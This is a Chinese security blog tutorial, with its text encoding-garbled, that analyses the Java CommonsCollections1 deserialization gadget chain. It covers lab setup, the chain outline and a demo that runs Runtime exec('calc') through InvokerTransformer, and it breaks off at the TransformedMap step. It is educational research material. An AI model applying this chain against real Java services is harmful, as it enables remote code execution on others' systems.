<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ | Timind's cafÃ©</title><meta name="author" content="Timind"><meta name="copyright" content="Timind"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†ææœ¬æ–‡å‚è€ƒç›¸å…³è§†é¢‘ï¼šã€Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXPã€‘ https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1no4y1U7E1&#x2F;?share_source&#x3D;copy_web&amp;vd_source&#x3D;5a6a99263af87e552e4139cdec53fd37 ç™½æ—¥æ¢¦ç»„é•¿çš„cc1é“¾åˆ†æï¼Œè®²çš„æ·±å…¥æµ…å‡º">
<meta property="og:type" content="article">
<meta property="og:title" content="javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ">
<meta property="og:url" content="http://timind-sec.github.io/posts/89a18773/index.html">
<meta property="og:site_name" content="Timind&#39;s cafÃ©">
<meta property="og:description" content="javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†ææœ¬æ–‡å‚è€ƒç›¸å…³è§†é¢‘ï¼šã€Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXPã€‘ https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1no4y1U7E1&#x2F;?share_source&#x3D;copy_web&amp;vd_source&#x3D;5a6a99263af87e552e4139cdec53fd37 ç™½æ—¥æ¢¦ç»„é•¿çš„cc1é“¾åˆ†æï¼Œè®²çš„æ·±å…¥æµ…å‡º">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://timind-sec.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2025-11-08T07:43:28.000Z">
<meta property="article:modified_time" content="2025-11-09T05:04:06.700Z">
<meta property="article:author" content="Timind">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://timind-sec.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ",
  "url": "http://timind-sec.github.io/posts/89a18773/",
  "image": "http://timind-sec.github.io/img/butterfly-icon.png",
  "datePublished": "2025-11-08T07:43:28.000Z",
  "dateModified": "2025-11-09T05:04:06.700Z",
  "author": [
    {
      "@type": "Person",
      "name": "Timind",
      "url": "http://timind-sec.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://timind-sec.github.io/posts/89a18773/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/url(https:/c-ssl.duitang.com/uploads/item/201902/27/20190227220253_hhrtf.jpg));"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Timind's cafÃ©</span></a><a class="nav-page-title" href="/"><span class="site-name">javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-11-08T07:43:28.000Z" title="å‘è¡¨äº 2025-11-08 15:43:28">2025-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-11-09T05:04:06.700Z" title="æ›´æ–°äº 2025-11-09 13:04:06">2025-11-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ"><a href="#javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ" class="headerlink" title="javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ"></a>javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ</h1><p>æœ¬æ–‡å‚è€ƒç›¸å…³è§†é¢‘ï¼šã€Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXPã€‘ <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?share_source=copy_web&vd_source=5a6a99263af87e552e4139cdec53fd37">https://www.bilibili.com/video/BV1no4y1U7E1/?share_source=copy_web&amp;vd_source=5a6a99263af87e552e4139cdec53fd37</a> ç™½æ—¥æ¢¦ç»„é•¿çš„cc1é“¾åˆ†æï¼Œè®²çš„æ·±å…¥æµ…å‡ºï¼Œéå¸¸ä¸é”™ã€‚</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133621214">Javaååºåˆ—åŒ–ï¼šCC1é“¾ è¯¦è§£_ccé“¾-CSDNåšå®¢</a></p>
<h2 id="ä¸€ã€è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€è°ƒè¯•ç¯å¢ƒæ­å»º"></a>ä¸€ã€è°ƒè¯•ç¯å¢ƒæ­å»º</h2><h3 id="ç»„ä»¶éœ€æ±‚ï¼š"><a href="#ç»„ä»¶éœ€æ±‚ï¼š" class="headerlink" title="ç»„ä»¶éœ€æ±‚ï¼š"></a>ç»„ä»¶éœ€æ±‚ï¼š</h3><p>æœ¬æ¬¡å®éªŒç¯å¢ƒæ‰€éœ€è¦çš„Commen-Collectionsçš„ç‰ˆæœ¬æ˜¯è¾ƒä½çš„3.2.1ï¼Œå¯¹åº”çš„xmlæ–‡ä»¶æ˜¯ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="jdkç‰ˆæœ¬éœ€æ±‚ï¼š"><a href="#jdkç‰ˆæœ¬éœ€æ±‚ï¼š" class="headerlink" title="jdkç‰ˆæœ¬éœ€æ±‚ï¼š"></a>jdkç‰ˆæœ¬éœ€æ±‚ï¼š</h3><p>ç”±äºä¸åŒç‰ˆæœ¬ä¸‹çš„jdkå¯¹Commen-Collectionsçš„è°ƒç”¨æ–¹å¼ä¸åŒï¼Œè¿™é‡Œé‡‡ç”¨çš„æ˜¯8u65ç‰ˆæœ¬çš„jdk</p>
<h3 id="commons-collectionsä¸­éƒ¨åˆ†æºç ä¸‹è½½ï¼š"><a href="#commons-collectionsä¸­éƒ¨åˆ†æºç ä¸‹è½½ï¼š" class="headerlink" title="commons-collectionsä¸­éƒ¨åˆ†æºç ä¸‹è½½ï¼š"></a>commons-collectionsä¸­éƒ¨åˆ†æºç ä¸‹è½½ï¼š</h3><p>åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€äº›å¤–éƒ¨ç»„ä»¶åŒ…æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œæ¯”å¦‚<code>sun/reflect/annotation/AnnotationInvocationHandler.java</code>å°±æ˜¯ååºåˆ—åŒ–ä¸­å¿…ä¸å¯å°‘çš„ä¸€ç¯ï¼Œä½†æ˜¯åœ¨ä½ ç›´æ¥mavenæ‹‰å–é¡¹ç›®çš„æ—¶å€™ï¼Œä½ ä¼šå‘ç°è¿™ä¸ª<code>AnnotationInvocationHandler.java</code>å¹¶ä¸æ˜¯æºä»£ç ï¼Œè€Œæ˜¯åç¼–è¯‘åçš„classä»£ç ï¼Œé‡Œé¢å¾ˆå¤šå‚æ•°éƒ½æ˜¯åç¼–è¯‘åçš„ï¼Œ<strong>å¯è¯»æ€§å¾ˆå·®</strong>ï¼Œä¹Ÿä¸æ–¹ä¾¿æˆ‘ä»¬çš„è°ƒè¯•å·¥ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨oracleçš„å®˜æ–¹ç½‘ç«™ä¸Šä¸‹è½½å…¶ç»„ä»¶çš„æºç ï¼Œå¹¶é‡æ–°å¯¼å…¥è‡³sdkï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<h4 id="è®¿é—®jdk8u-jdk8u-jdk-af660750b2f4ä¸‹è½½æºç "><a href="#è®¿é—®jdk8u-jdk8u-jdk-af660750b2f4ä¸‹è½½æºç " class="headerlink" title="è®¿é—®jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4ä¸‹è½½æºç "></a>è®¿é—®<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4#l1.3">jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4</a>ä¸‹è½½æºç </h4><p>ä»ä¸­å°±èƒ½è·å–åˆ°sunåŒ…æºç </p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\27c957fd-1db6-48ce-af76-7e872a1d4bf5.png"></p>
<p>ä¸‹è½½ä¹‹åï¼Œæˆ‘ä»¬ç›´æ¥</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp.webp" alt="webp"></p>
<p>æ‰“å¼€ä¹‹åä¼šæœ‰ä¸€ä¸ªsunåŒ…ï¼Œå°†sunåŒ…æ‹·è´è‡³jdk1.8.0_65&#x2F;åº•ä¸‹çš„srcä¸­ï¼Œå†å°†srcè·¯å¾„å¯¼å…¥è‡³ideaçš„sdkå³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp1.webp" alt="webp1"></p>
<p>å¯¼å…¥å®Œæˆä¹‹åå°±èƒ½å‘ç°ï¼Œæˆ‘ä»¬çš„AnnotationInvocationHandler.classå°±ä¼šè½¬å˜æˆjavaæ–‡ä»¶</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\image-20251109125346413.png" alt="image-20251109125346413"></p>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æˆ‘ä»¬â€æ„‰å¿«çš„â€œcc1é“¾å­¦ä¹ äº†ï¼</p>
<p><strong>å…ˆæŠŠæ•´ä¸ªé“¾å­æ”¾å‡ºæ¥</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()--&gt;</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;</span><br><span class="line">TransformedMap.checkSetValue()--&gt;</span><br><span class="line">ChainedTransformer.transform()--&gt;</span><br><span class="line">InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="ç¬¬ä¸€æ­¥è°ƒç”¨ï¼šTransformer"><a href="#ç¬¬ä¸€æ­¥è°ƒç”¨ï¼šTransformer" class="headerlink" title="ç¬¬ä¸€æ­¥è°ƒç”¨ï¼šTransformer"></a>ç¬¬ä¸€æ­¥è°ƒç”¨ï¼šTransformer</h2><p>å¯ä»¥çœ‹åˆ°ï¼Œæ•´æ¡é“¾å­çš„æœ«å°¾æ˜¯transformæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬ç›´æ¥çœ‹ä»–æœ€åˆçš„å®šä¹‰</p>
<p>è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹Transformerï¼Œå¯ä»¥çœ‹åˆ°Transformeræ¥å£å†™äº†ä¸€ä¸ªtransform()æ–¹æ³•</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\image-20251109125413721.png" alt="image-20251109125413721"></p>
<p>å³é”®å¹¶æŸ¥æ‰¾ç”¨æ³•ï¼ŒæŸ¥çœ‹åœ¨æ•´ä¸ªé¡¹ç›®ä¸­åœ¨å“ªäº›ä¸åŒåç±»ä¸­è°ƒç”¨äº†transformæ–¹æ³•</p>
<p>èšç„¦åˆ°åŒ…<code>org.apache.commons.collections.functors</code>ä¸­çš„<code>InvokerTransformer</code>ç±»å®ç°äº†<code>Tranformer</code>æ¥å£ä¸­<code>transform</code>æ–¹æ³•ã€‚æ­¤æ–¹æ³•æ¥æ”¶äº†ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶ååå°„è°ƒç”¨ï¼Œå‚æ•°å¯æ§å°±å¯¼è‡´äº†<strong>åå°„è°ƒç”¨ä»»æ„ç±» ä»»æ„æ–¹æ³•</strong></p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp3-1762664087552-21.png" alt="webp3"></p>
<p>è¿™é‡Œè¡¥å……ä¸€ä¸ªçŸ¥è¯†ï¼š<code>method.invoke(input,this.iArgs)==input.method(this.iArgs)</code>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¦‚æœè¦ä½¿ç”¨Runtimeæ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œæ­£å¸¸æ¥è¯´å°±æ˜¯Runtime.getRuntime().exec(cmd)ï¼Œç”¨invokeæ‰§è¡Œçš„è¯æˆ‘ä»¬å°±åº”è¯¥æ˜¯exec.invoke(Runtime.getRuntime(),cmd)</p>
<p>æ¥ç€æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹InvokerTransformerçš„æ„é€ å‡½æ•°</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp4-1762664065808-19.png" alt="webp4"></p>
<p>å¦‚æœæˆ‘ä»¬æƒ³è¦è®©æŸä¸ªç±»å»è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œå¹¶åœ¨æ–¹æ³•é‡Œé¢ä¼ å…¥å‚æ•°ï¼ˆè¿™é‡Œä»¥è§¦å‘è®¡ç®—å™¨ä¸ºä¾‹ï¼‰é‚£å°±æ˜¯InvokerTransfomer(â€œexecâ€,new Class[]{String.class},new Obejct[]{â€œcalcâ€}).transform(Runtime.class);</p>
<p>å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//æ­£å¸¸ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Class clazz = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method cmdMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//cmdMethod.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//InvokerTransformerç±» è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å°±æ˜¯é“¾å­çš„æœ€åä¸€æ­¥ï¼Œéå¸¸çš„ç®€å•</p>
<h2 id="ç¬¬äºŒæ­¥ï¼šTransformedMap-checkSetValue-çš„è°ƒç”¨"><a href="#ç¬¬äºŒæ­¥ï¼šTransformedMap-checkSetValue-çš„è°ƒç”¨" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šTransformedMap.checkSetValue()çš„è°ƒç”¨"></a>ç¬¬äºŒæ­¥ï¼šTransformedMap.checkSetValue()çš„è°ƒç”¨</h2><p>å…¶å®æŒ‰ç…§åˆšåˆšé‚£æ¡é“¾å­æ¥çœ‹ï¼ŒInvokerTransformerå‰é¢è¿˜æœ‰ä¸€ä¸ªChainedTransformerï¼Œä½†æ˜¯è¿™ä¸ªè·Ÿåé¢çš„åºåˆ—åŒ–è¿‡ç¨‹æœ‰å…³ï¼Œæˆ‘ä»¬å…ˆä¸äºˆè®¨è®ºï¼Œåé¢ä¼šè®²ï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹è¿™ä¸ª<strong>TransformedMapçš„checkSetValue()</strong></p>
<p>é¡ºå¸¦è¡¥å……ä¸€å¥ï¼Œè‡ªå·±æ‰¾çš„æ—¶å€™ï¼Œä¸è¦æ‰¾ä¸åŒç±»transform()æ–¹æ³•è°ƒç”¨InvokerTransformerç±»çš„transform()æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µå°±æ˜¯transform()æ–¹æ³•å†å»è°ƒç”¨transform()æ–¹æ³•ï¼Œæ²¡æœ‰æ„ä¹‰ã€‚</p>
<p>æˆ‘ä»¬æ˜¯æƒ³è¦å›åˆ°æŸä¸ªç±»çš„readObject()æ–¹æ³•ï¼Œå¦‚ä¸Šæƒ…å†µæ°¸è¿œå›ä¸å»ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è·Ÿçš„æ—¶å€™ï¼Œè¦è€ƒè™‘å‘¨å…¨<br>å¼€å§‹è¿›ä¸€æ­¥æ‰¾é“¾å­çš„æ—¶å€™ï¼Œè®°å¾—ä½¿ç”¨mavenä¸‹è½½æºç </p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp5-1762664105744-23.png" alt="webp5"></p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp6.png" alt="webp6"></p>
<p>åˆ©ç”¨mavenä¸‹è½½æºç ï¼Œè¿™æ ·åœ¨æŸ¥æ‰¾ç”¨æ³•çš„æ—¶å€™æ‰èƒ½æ‰¾çš„æ›´å…¨ã€‚</p>
<p>æ ¹æ®ysoserialçš„payloadï¼Œæˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘mapç±»ï¼Œè·Ÿè¿›å»å‘ç°æœ‰ä¸€ä¸ª<code>TransformedMap</code>ç±»ï¼Œå…¶ä¸­çš„checkSetValueæ–¹æ³•å°±è°ƒç”¨äº†transform()æ–¹æ³•</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp7.png" alt="webp7"></p>
<p>è°ƒç”¨æ–¹å¼ä¸º<img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp8.png" alt="webp8"></p>
<p>valueTransformer.transform(value);è¿™é‡Œä½œä¸ªæ ‡è®°</p>
<p>ç„¶åå†æ¥çœ‹æ„é€ æ–¹æ³•</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp9.png" alt="webp9"></p>
<p>ä¸è¿‡å¾ˆå¯æƒœï¼Œè¿™ä¸ªæ„é€ æ–¹æ³•æ˜¯protectedç±»å‹ï¼Œä¸èƒ½ç›´æ¥åœ¨å¤–éƒ¨è°ƒç”¨ï¼Œæˆ‘ä»¬çœ‹çœ‹èƒ½ä¸èƒ½åœ¨åˆ«çš„åœ°æ–¹çœ‹åˆ°TransformedMapçš„è°ƒç”¨ã€‚</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp10.png" alt="webp10"></p>
<p>åœ¨æŸ¥æ‰¾çš„æ—¶å€™å°±èƒ½çœ‹åˆ°ä¸€ä¸ªé™æ€æ–¹æ³•decorateï¼Œä¸å¾—ä¸è¯´æœ‰æ—¶å€™javaçš„å±‚å±‚è°ƒç”¨å°±åƒæ˜¯è‰ºæœ¯ä¸€èˆ¬ï¼Œå¾ˆå¤šä¸œè¥¿éƒ½éå¸¸å‡‘å·§ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç›´æ¥è°ƒç”¨decorateæ–¹æ³•ä»è€Œæ„é€ ä¸€ä¸ªæœ‰å‚çš„TransformedMap</p>
<p>ä½†æ˜¯è¿˜æ²¡ç»“æŸ</p>
<p><code>TransformedMap.decorate(map, keyTransformer, valueTransformer)</code> çš„ä½œç”¨ï¼š</p>
<ul>
<li>è¿”å›ä¸€ä¸ªè£…é¥°åçš„ <code>TransformedMap</code> å¯¹è±¡ï¼›</li>
<li>å®ƒä¼šåœ¨åç»­å¯¹ <code>map</code> çš„ <strong>put &#x2F; setValue</strong> æ“ä½œä¸­ï¼Œå¯¹é”®å’Œå€¼è¿›è¡Œ transformer è½¬æ¢ã€‚</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<blockquote>
<p>å®ƒåªæ˜¯æŠŠ map åŒ…äº†ä¸€å±‚é€»è¾‘ï¼Œå‘Šè¯‰ JVMã€Œå½“æˆ‘å¾€é‡Œæ”¾é”®å€¼æˆ–ä¿®æ”¹å€¼æ—¶ï¼Œè¦è°ƒç”¨ transformerã€ï¼Œä½†æ­¤æ—¶å¹¶æ²¡æœ‰æ‰§è¡Œ transformerã€‚</p>
</blockquote>
<p>æ­¤é˜¶æ®µåªæ˜¯â€œå¸ƒç½®é™·é˜±â€ï¼Œæ²¡æœ‰è§¦å‘ç‚¹ã€‚</p>
<p>ç»§ç»­è·Ÿè¿›é“¾å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MapEntry.setValue(Object value)</span><br><span class="line">    -&gt; checkSetValue(value)</span><br><span class="line">        -&gt; valueTransformer.transform(value)</span><br></pre></td></tr></table></figure>

<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp11.png" alt="webp11"></p>
